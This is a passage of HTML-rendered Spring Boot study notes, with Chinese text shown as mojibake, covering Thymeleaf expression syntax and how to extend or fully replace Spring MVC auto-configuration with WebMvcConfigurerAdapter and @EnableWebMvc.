class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span> <span class="attr">xmlns:th</span>=<span class="string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>æˆåŠŸï¼<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--th:text å°†divé‡Œé¢çš„æ–‡æœ¬å†…å®¹è®¾ç½®ä¸º --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;hello&#125;&quot;</span>&gt;</span>è¿™æ˜¯æ˜¾ç¤ºæ¬¢è¿ä¿¡æ¯<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3><span id="3-è¯­æ³•è§„åˆ™">3ã€è¯­æ³•è§„åˆ™</span></h3><p>1ï¼‰ã€th:textï¼›æ”¹å˜å½“å‰å…ƒç´ é‡Œé¢çš„æ–‡æœ¬å†…å®¹ï¼›</p><p>â€‹thï¼šä»»æ„htmlå±æ€§ï¼›æ¥æ›¿æ¢åŸç”Ÿå±æ€§çš„å€¼</p><p><img src="/2020/03/30/Spring%20Boot%E7%AC%94%E8%AE%B0/2018-02-04_123955.png"></p><p>2ï¼‰ã€è¡¨è¾¾å¼ï¼Ÿ</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Simple</span> <span class="string">expressions:ï¼ˆè¡¨è¾¾å¼è¯­æ³•ï¼‰</span></span><br><span class="line">    <span class="attr">Variable</span> <span class="string">Expressions: $&#123;...&#125;ï¼šè·å–å˜é‡å€¼ï¼›OGNLï¼›</span></span><br><span class="line">    <span class="attr">1ï¼‰ã€è·å–å¯¹è±¡çš„å±æ€§ã€è°ƒç”¨æ–¹æ³•</span></span><br><span class="line">    <span class="attr">2ï¼‰ã€ä½¿ç”¨å†…ç½®çš„åŸºæœ¬å¯¹è±¡ï¼š</span></span><br><span class="line"><span class="comment">    #ctx : the context object.</span></span><br><span class="line"><span class="comment">    #vars: the context variables.</span></span><br><span class="line"><span class="comment">                #locale : the context locale.</span></span><br><span class="line"><span class="comment">                #request : (only in Web Contexts) the HttpServletRequest object.</span></span><br><span class="line"><span class="comment">                #response : (only in Web Contexts) the HttpServletResponse object.</span></span><br><span class="line"><span class="comment">                #session : (only in Web Contexts) the HttpSession object.</span></span><br><span class="line"><span class="comment">                #servletContext : (only in Web Contexts) the ServletContext object.</span></span><br><span class="line">                </span><br><span class="line">                <span class="attr">$&#123;session.foo&#125;</span></span><br><span class="line">            <span class="attr">3ï¼‰ã€å†…ç½®çš„ä¸€äº›å·¥å…·å¯¹è±¡ï¼š</span></span><br><span class="line"><span class="comment">#execInfo : information about the template being processed.</span></span><br><span class="line"><span class="comment">#messages : methods for obtaining externalized messages inside variables expressions, in the same way as they would be obtained using #&#123;â€¦&#125; syntax.</span></span><br><span class="line"><span class="comment">#uris : methods for escaping parts of URLs/URIs</span></span><br><span class="line"><span class="comment">#conversions : methods for executing the configured conversion service (if any).</span></span><br><span class="line"><span class="comment">#dates : methods for java.util.Date objects: formatting, component extraction, etc.</span></span><br><span class="line"><span class="comment">#calendars : analogous to #dates , but for java.util.Calendar objects.</span></span><br><span class="line"><span class="comment">#numbers : methods for formatting numeric objects.</span></span><br><span class="line"><span class="comment">#strings : methods for String objects: contains, startsWith, prepending/appending, etc.</span></span><br><span class="line"><span class="comment">#objects : methods for objects in general.</span></span><br><span class="line"><span class="comment">#bools : methods for boolean evaluation.</span></span><br><span class="line"><span class="comment">#arrays : methods for arrays.</span></span><br><span class="line"><span class="comment">#lists : methods for lists.</span></span><br><span class="line"><span class="comment">#sets : methods for sets.</span></span><br><span class="line"><span class="comment">#maps : methods for maps.</span></span><br><span class="line"><span class="comment">#aggregates : methods for creating aggregates on arrays or collections.</span></span><br><span class="line"><span class="comment">#ids : methods for dealing with id attributes that might be repeated (for example, as a result of an iteration).</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">Selection</span> <span class="string">Variable Expressions: *&#123;...&#125;ï¼šé€‰æ‹©è¡¨è¾¾å¼ï¼šå’Œ$&#123;&#125;åœ¨åŠŸèƒ½ä¸Šæ˜¯ä¸€æ ·ï¼›</span></span><br><span class="line">    <span class="attr">è¡¥å……ï¼šé…åˆ</span> <span class="string">th:object=&quot;$&#123;session.user&#125;ï¼š</span></span><br><span class="line">   <span class="attr">&lt;div</span> <span class="string">th:object=&quot;$&#123;session.user&#125;&quot;&gt;</span></span><br><span class="line">    <span class="attr">&lt;p&gt;Name</span>: <span class="string">&lt;span th:text=&quot;*&#123;firstName&#125;&quot;&gt;Sebastian&lt;/span&gt;.&lt;/p&gt;</span></span><br><span class="line">    <span class="attr">&lt;p&gt;Surname</span>: <span class="string">&lt;span th:text=&quot;*&#123;lastName&#125;&quot;&gt;Pepper&lt;/span&gt;.&lt;/p&gt;</span></span><br><span class="line">    <span class="attr">&lt;p&gt;Nationality</span>: <span class="string">&lt;span th:text=&quot;*&#123;nationality&#125;&quot;&gt;Saturn&lt;/span&gt;.&lt;/p&gt;</span></span><br><span class="line">    <span class="attr">&lt;/div&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="attr">Message</span> <span class="string">Expressions: #&#123;...&#125;ï¼šè·å–å›½é™…åŒ–å†…å®¹</span></span><br><span class="line">    <span class="attr">Link</span> <span class="string">URL Expressions: @&#123;...&#125;ï¼šå®šä¹‰URLï¼›</span></span><br><span class="line">    <span class="attr">@&#123;/order/process(execId</span>=<span class="string">$&#123;execId&#125;,execType=&#x27;FAST&#x27;)&#125;</span></span><br><span class="line">    <span class="attr">Fragment</span> <span class="string">Expressions: ~&#123;...&#125;ï¼šç‰‡æ®µå¼•ç”¨è¡¨è¾¾å¼</span></span><br><span class="line">    <span class="attr">&lt;div</span> <span class="string">th:insert=&quot;~&#123;commons :: main&#125;&quot;&gt;...&lt;/div&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="attr">Literalsï¼ˆå­—é¢é‡ï¼‰</span></span><br><span class="line">      <span class="attr">Text</span> <span class="string">literals: &#x27;one text&#x27; , &#x27;Another one!&#x27; ,â€¦</span></span><br><span class="line">      <span class="attr">Number</span> <span class="string">literals: 0 , 34 , 3.0 , 12.3 ,â€¦</span></span><br><span class="line">      <span class="attr">Boolean</span> <span class="string">literals: true , false</span></span><br><span class="line">      <span class="attr">Null</span> <span class="string">literal: null</span></span><br><span class="line">      <span class="attr">Literal</span> <span class="string">tokens: one , sometext , main ,â€¦</span></span><br><span class="line"><span class="attr">Text</span> <span class="string">operations:ï¼ˆæ–‡æœ¬æ“ä½œï¼‰</span></span><br><span class="line">    <span class="attr">String</span> <span class="string">concatenation: +</span></span><br><span class="line">    <span class="attr">Literal</span> <span class="string">substitutions: |The name is $&#123;name&#125;|</span></span><br><span class="line"><span class="attr">Arithmetic</span> <span class="string">operations:ï¼ˆæ•°å­¦è¿ç®—ï¼‰</span></span><br><span class="line">    <span class="attr">Binary</span> <span class="string">operators: + , - , * , / , %</span></span><br><span class="line">    <span class="attr">Minus</span> <span class="string">sign (unary operator): -</span></span><br><span class="line"><span class="attr">Boolean</span> <span class="string">operations:ï¼ˆå¸ƒå°”è¿ç®—ï¼‰</span></span><br><span class="line">    <span class="attr">Binary</span> <span class="string">operators: and , or</span></span><br><span class="line">    <span class="attr">Boolean</span> <span class="string">negation (unary operator): ! , not</span></span><br><span class="line"><span class="attr">Comparisons</span> <span class="string">and equality:ï¼ˆæ¯”è¾ƒè¿ç®—ï¼‰</span></span><br><span class="line">    <span class="attr">Comparators</span>: <span class="string">&gt; , &lt; , &gt;= , &lt;= ( gt , lt , ge , le )</span></span><br><span class="line">    <span class="attr">Equality</span> <span class="string">operators: == , != ( eq , ne )</span></span><br><span class="line"><span class="attr">Conditional</span> <span class="string">operators:æ¡ä»¶è¿ç®—ï¼ˆä¸‰å…ƒè¿ç®—ç¬¦ï¼‰</span></span><br><span class="line">    <span class="attr">If-then</span>: <span class="string">(if) ? (then)</span></span><br><span class="line">    <span class="attr">If-then-else</span>: <span class="string">(if) ? (then) : (else)</span></span><br><span class="line">    <span class="attr">Default</span>: <span class="string">(value) ?: (defaultvalue)</span></span><br><span class="line"><span class="attr">Special</span> <span class="string">tokens:</span></span><br><span class="line">    <span class="attr">No-Operation</span>: <span class="string">_ </span></span><br></pre></td></tr></table></figure><h2><span id="4-springmvcè‡ªåŠ¨é…ç½®">4ã€SpringMVCè‡ªåŠ¨é…ç½®</span></h2><p><a href="https://docs.spring.io/spring-boot/docs/1.5.10.RELEASE/reference/htmlsingle/#boot-features-developing-web-applications">https://docs.spring.io/spring-boot/docs/1.5.10.RELEASE/reference/htmlsingle/#boot-features-developing-web-applications</a></p><h3><span id="1-spring-mvc-auto-configuration">1. Spring MVC auto-configuration</span></h3><p>Spring Boot è‡ªåŠ¨é…ç½®å¥½äº†SpringMVC</p><p>ä»¥ä¸‹æ˜¯SpringBootå¯¹SpringMVCçš„é»˜è®¤é…ç½®:<strong>&#x3D;&#x3D;ï¼ˆWebMvcAutoConfigurationï¼‰&#x3D;&#x3D;</strong></p><ul><li><p>Inclusion of <code>ContentNegotiatingViewResolver</code> and <code>BeanNameViewResolver</code> beans.</p><ul><li>è‡ªåŠ¨é…ç½®äº†ViewResolverï¼ˆè§†å›¾è§£æå™¨ï¼šæ ¹æ®æ–¹æ³•çš„è¿”å›å€¼å¾—åˆ°è§†å›¾å¯¹è±¡ï¼ˆViewï¼‰ï¼Œè§†å›¾å¯¹è±¡å†³å®šå¦‚ä½•æ¸²æŸ“ï¼ˆè½¬å‘ï¼Ÿé‡å®šå‘ï¼Ÿï¼‰ï¼‰</li><li>ContentNegotiatingViewResolverï¼šç»„åˆæ‰€æœ‰çš„è§†å›¾è§£æå™¨çš„ï¼›</li><li>&#x3D;&#x3D;å¦‚ä½•å®šåˆ¶ï¼šæˆ‘ä»¬å¯ä»¥è‡ªå·±ç»™å®¹å™¨ä¸­æ·»åŠ ä¸€ä¸ªè§†å›¾è§£æå™¨ï¼›è‡ªåŠ¨çš„å°†å…¶ç»„åˆè¿›æ¥ï¼›&#x3D;&#x3D;</li></ul></li><li><p>Support for serving static resources, including support for WebJars (see below).é™æ€èµ„æºæ–‡ä»¶å¤¹è·¯å¾„,webjars</p></li><li><p>Static <code>index.html</code> support. é™æ€é¦–é¡µè®¿é—®</p></li><li><p>Custom <code>Favicon</code> support (see below).  favicon.ico</p></li><li><p>è‡ªåŠ¨æ³¨å†Œäº† of <code>Converter</code>, <code>GenericConverter</code>, <code>Formatter</code> beans.</p><ul><li>Converterï¼šè½¬æ¢å™¨ï¼›  public String hello(User user)ï¼šç±»å‹è½¬æ¢ä½¿ç”¨Converter</li><li><code>Formatter</code>  æ ¼å¼åŒ–å™¨ï¼›  2017.12.17&#x3D;&#x3D;&#x3D;Dateï¼›</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="meta">@ConditionalOnProperty(prefix = &quot;spring.mvc&quot;, name = &quot;date-format&quot;)</span><span class="comment">//åœ¨æ–‡ä»¶ä¸­é…ç½®æ—¥æœŸæ ¼å¼åŒ–çš„è§„åˆ™</span></span><br><span class="line"><span class="keyword">public</span> Formatter&lt;Date&gt; <span class="title function_">dateFormatter</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">DateFormatter</span>(<span class="built_in">this</span>.mvcProperties.getDateFormat());<span class="comment">//æ—¥æœŸæ ¼å¼åŒ–ç»„ä»¶</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹&#x3D;&#x3D;è‡ªå·±æ·»åŠ çš„æ ¼å¼åŒ–å™¨è½¬æ¢å™¨ï¼Œæˆ‘ä»¬åªéœ€è¦æ”¾åœ¨å®¹å™¨ä¸­å³å¯&#x3D;&#x3D;</p><ul><li><p>Support for <code>HttpMessageConverters</code> (see below).</p><ul><li><p>HttpMessageConverterï¼šSpringMVCç”¨æ¥è½¬æ¢Httpè¯·æ±‚å’Œå“åº”çš„ï¼›Userâ€”Jsonï¼›</p></li><li><p><code>HttpMessageConverters</code> æ˜¯ä»å®¹å™¨ä¸­ç¡®å®šï¼›è·å–æ‰€æœ‰çš„HttpMessageConverterï¼›</p><p>&#x3D;&#x3D;è‡ªå·±ç»™å®¹å™¨ä¸­æ·»åŠ HttpMessageConverterï¼Œåªéœ€è¦å°†è‡ªå·±çš„ç»„ä»¶æ³¨å†Œå®¹å™¨ä¸­ï¼ˆ@Bean,@Componentï¼‰&#x3D;&#x3D;</p></li></ul></li><li><p>Automatic registration of <code>MessageCodesResolver</code> (see below).å®šä¹‰é”™è¯¯ä»£ç ç”Ÿæˆè§„åˆ™</p></li><li><p>Automatic use of a <code>ConfigurableWebBindingInitializer</code> bean (see below).</p><p>&#x3D;&#x3D;æˆ‘ä»¬å¯ä»¥é…ç½®ä¸€ä¸ªConfigurableWebBindingInitializeræ¥æ›¿æ¢é»˜è®¤çš„ï¼›ï¼ˆæ·»åŠ åˆ°å®¹å™¨ï¼‰&#x3D;&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">åˆå§‹åŒ–WebDataBinderï¼›</span><br><span class="line">è¯·æ±‚æ•°æ®=====JavaBeanï¼›</span><br></pre></td></tr></table></figure></li></ul><p><strong>org.springframework.boot.autoconfigure.webï¼šwebçš„æ‰€æœ‰è‡ªåŠ¨åœºæ™¯ï¼›</strong></p><p>If you want to keep Spring Boot MVC features, and you just want to add additional <a href="https://docs.spring.io/spring/docs/4.3.14.RELEASE/spring-framework-reference/htmlsingle#mvc">MVC configuration</a> (interceptors, formatters, view controllers etc.) you can add your own <code>@Configuration</code> class of type <code>WebMvcConfigurerAdapter</code>, but <strong>without</strong> <code>@EnableWebMvc</code>. If you wish to provide custom instances of <code>RequestMappingHandlerMapping</code>, <code>RequestMappingHandlerAdapter</code> or <code>ExceptionHandlerExceptionResolver</code> you can declare a <code>WebMvcRegistrationsAdapter</code> instance providing such components.</p><p>If you want to take complete control of Spring MVC, you can add your own <code>@Configuration</code> annotated with <code>@EnableWebMvc</code>.</p><h3><span id="2-æ‰©å±•springmvc">2ã€æ‰©å±•SpringMVC</span></h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mvc:view-controller</span> <span class="attr">path</span>=<span class="string">&quot;/hello&quot;</span> <span class="attr">view-name</span>=<span class="string">&quot;success&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mvc:interceptors</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:interceptor</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mvc:mapping</span> <span class="attr">path</span>=<span class="string">&quot;/hello&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mvc:interceptor</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mvc:interceptors</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>&#x3D;&#x3D;ç¼–å†™ä¸€ä¸ªé…ç½®ç±»ï¼ˆ@Configurationï¼‰ï¼Œæ˜¯WebMvcConfigurerAdapterç±»å‹ï¼›ä¸èƒ½æ ‡æ³¨@EnableWebMvc&#x3D;&#x3D;</strong>;</p><p>æ—¢ä¿ç•™äº†æ‰€æœ‰çš„è‡ªåŠ¨é…ç½®ï¼Œä¹Ÿèƒ½ç”¨æˆ‘ä»¬æ‰©å±•çš„é…ç½®ï¼›</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä½¿ç”¨WebMvcConfigurerAdapterå¯ä»¥æ¥æ‰©å±•SpringMVCçš„åŠŸèƒ½</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyMvcConfig</span> <span class="keyword">extends</span> <span class="title class_">WebMvcConfigurerAdapter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addViewControllers</span><span class="params">(ViewControllerRegistry registry)</span> &#123;</span><br><span class="line">       <span class="comment">// super.addViewControllers(registry);</span></span><br><span class="line">        <span class="comment">//æµè§ˆå™¨å‘é€ /atguigu è¯·æ±‚æ¥åˆ° success</span></span><br><span class="line">        registry.addViewController(<span class="string">&quot;/atguigu&quot;</span>).setViewName(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŸç†ï¼š</p><p>â€‹1ï¼‰ã€WebMvcAutoConfigurationæ˜¯SpringMVCçš„è‡ªåŠ¨é…ç½®ç±»</p><p>â€‹2ï¼‰ã€åœ¨åšå…¶ä»–è‡ªåŠ¨é…ç½®æ—¶ä¼šå¯¼å…¥ï¼›@Import(<strong>EnableWebMvcConfiguration</strong>.class)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">   <span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">EnableWebMvcConfiguration</span> <span class="keyword">extends</span> <span class="title class_">DelegatingWebMvcConfiguration</span> &#123;</span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">WebMvcConfigurerComposite</span> <span class="variable">configurers</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebMvcConfigurerComposite</span>();</span><br><span class="line"></span><br><span class="line"> <span class="comment">//ä»å®¹å™¨ä¸­è·å–æ‰€æœ‰çš„WebMvcConfigurer</span></span><br><span class="line">     <span class="meta">@Autowired(required = false)</span></span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setConfigurers</span><span class="params">(List&lt;WebMvcConfigurer&gt; configurers)</span> &#123;</span><br><span class="line">         <span class="keyword">if</span> (!CollectionUtils.isEmpty(configurers)) &#123;</span><br><span class="line">             <span class="built_in">this</span>.configurers.addWebMvcConfigurers(configurers);</span><br><span class="line">           <span class="comment">//ä¸€ä¸ªå‚è€ƒå®ç°ï¼›å°†æ‰€æœ‰çš„WebMvcConfigurerç›¸å…³é…ç½®éƒ½æ¥ä¸€èµ·è°ƒç”¨ï¼›  </span></span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">            <span class="comment">// public void addViewControllers(ViewControllerRegistry registry) &#123;</span></span><br><span class="line">             <span class="comment">//    for (WebMvcConfigurer delegate : this.delegates) &#123;</span></span><br><span class="line">              <span class="comment">//       delegate.addViewControllers(registry);</span></span><br><span class="line">              <span class="comment">//   &#125;</span></span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹3ï¼‰ã€å®¹å™¨ä¸­æ‰€æœ‰çš„WebMvcConfigureréƒ½ä¼šä¸€èµ·èµ·ä½œç”¨ï¼›</p><p>â€‹4ï¼‰ã€æˆ‘ä»¬çš„é…ç½®ç±»ä¹Ÿä¼šè¢«è°ƒç”¨ï¼›</p><p>â€‹æ•ˆæœï¼šSpringMVCçš„è‡ªåŠ¨é…ç½®å’Œæˆ‘ä»¬çš„æ‰©å±•é…ç½®éƒ½ä¼šèµ·ä½œç”¨ï¼›</p><h3><span id="3-å…¨é¢æ¥ç®¡springmvc">3ã€å…¨é¢æ¥ç®¡SpringMVCï¼›</span></h3><p>SpringBootå¯¹SpringMVCçš„è‡ªåŠ¨é…ç½®ä¸éœ€è¦äº†ï¼Œæ‰€æœ‰éƒ½æ˜¯æˆ‘ä»¬è‡ªå·±é…ç½®ï¼›æ‰€æœ‰çš„SpringMVCçš„è‡ªåŠ¨é…ç½®éƒ½å¤±æ•ˆäº†</p><p><strong>æˆ‘ä»¬éœ€è¦åœ¨é…ç½®ç±»ä¸­æ·»åŠ @EnableWebMvcå³å¯ï¼›</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä½¿ç”¨WebMvcConfigurerAdapterå¯ä»¥æ¥æ‰©å±•SpringMVCçš„åŠŸèƒ½</span></span><br><span class="line"><span class="meta">@EnableWebMvc</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyMvcConfig</span> <span class="keyword">extends</span> <span class="title class_">WebMvcConfigurerAdapter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addViewControllers</span><span class="params">(ViewControllerRegistry registry)</span> &#123;</span><br><span class="line">       <span class="comment">// super.addViewControllers(registry);</span></span><br><span class="line">        <span class="comment">//æµè§ˆå™¨å‘é€ /atguigu è¯·æ±‚æ¥åˆ° success</span></span><br><span class="line">        registry.addViewController(<span class="string">&quot;/atguigu&quot;</span>).setViewName(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŸç†ï¼š</p><p>ä¸ºä»€ä¹ˆ@EnableWebMvcè‡ªåŠ¨é…ç½®å°±å¤±æ•ˆäº†ï¼›</p><p>1ï¼‰@EnableWebMvcçš„æ ¸å¿ƒ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Import(DelegatingWebMvcConfiguration.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> EnableWebMvc &#123;</span><br></pre></td></tr></table></figure><p>2ï¼‰ã€</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DelegatingWebMvcConfiguration</span> <span class="keyword">extends</span> <span class="title class_">WebMvcConfigurationSupport</span> &#123;</span><br></pre></td></tr></table></figure><p>3ï¼‰ã€</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ConditionalOnWebApplication</span></span><br><span class="line"><span class="meta">@ConditionalOnClass(&#123; Servlet.class, DispatcherServlet.class,</span></span><br><span class="line"><span class="meta">WebMvcConfigurerAdapter.class &#125;)</span></span><br><span class="line"><span class="comment">//å®¹å™¨ä¸­æ²¡æœ‰è¿™ä¸ªç»„ä»¶çš„æ—¶å€™ï¼Œè¿™ä¸ªè‡ªåŠ¨é…ç½®ç±»æ‰ç”Ÿæ•ˆ</span></span><br><span class="line"><span class="meta">@ConditionalOnMissingBean(WebMvcConfigurationSupport.class)</span></span><br><span class="line"><span class="meta">@AutoConfigureOrder(Ordered.HIGHEST_PRECEDENCE + 10)</span></span><br><span class="line"><span class="meta">@AutoConfigureAfter(&#123; DispatcherServletAutoConfiguration.class,</span></span><br><span class="line"><span class="meta">ValidationAutoConfiguration.class &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebMvcAutoConfiguration</span> &#123;</span><br></pre></td></tr></table></figure><p>4ï¼‰ã€@EnableWebMvcå°†WebMvcConfigurationSupportç»„ä»¶å¯¼å…¥è¿›æ¥ï¼›</p><p>5ï¼‰ã€å¯¼å…¥çš„WebMvcConfigurationSupportåªæ˜¯SpringMVCæœ€åŸºæœ¬çš„åŠŸèƒ½ï¼›</p><h2><span id="5-å¦‚ä½•ä¿®æ”¹springbootçš„é»˜è®¤é…ç½®">5ã€å¦‚ä½•ä¿®æ”¹SpringBootçš„é»˜è®¤é…ç½®</span></h2><p>æ¨¡å¼ï¼š</p><p>â€‹1ï¼‰ã€SpringBootåœ¨è‡ªåŠ¨é…ç½®å¾ˆå¤šç»„ä»¶çš„æ—¶å€™ï¼Œå…ˆçœ‹å®¹å™¨ä¸­æœ‰æ²¡æœ‰ç”¨æˆ·è‡ªå·±é…ç½®çš„ï¼ˆ@Beanã€@Componentï¼‰å¦‚æœæœ‰å°±ç”¨ç”¨æˆ·é…ç½®çš„ï¼Œå¦‚æœæ²¡æœ‰ï¼Œæ‰è‡ªåŠ¨é…ç½®ï¼›å¦‚æœæœ‰äº›ç»„ä»¶å¯ä»¥æœ‰å¤šä¸ªï¼ˆViewResolverï¼‰å°†ç”¨æˆ·é…ç½®çš„å’Œè‡ªå·±é»˜è®¤çš„ç»„åˆèµ·æ¥ï¼›</p><p>â€‹2ï¼‰ã€åœ¨SpringBootä¸­ä¼šæœ‰éå¸¸å¤šçš„xxxConfigurerå¸®åŠ©æˆ‘ä»¬è¿›è¡Œæ‰©å±•é…ç½®</p><p>â€‹3ï¼‰ã€åœ¨SpringBootä¸­ä¼šæœ‰å¾ˆå¤šçš„xxxCustomizerå¸®åŠ©æˆ‘ä»¬è¿›è¡Œå®šåˆ¶é…ç½®</p><h2><span id="6-restfulcrud">6ã€RestfulCRUD</span></h2><h3><span id="1-é»˜è®¤è®¿é—®é¦–é¡µ">1ï¼‰ã€é»˜è®¤è®¿é—®é¦–é¡µ</span></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 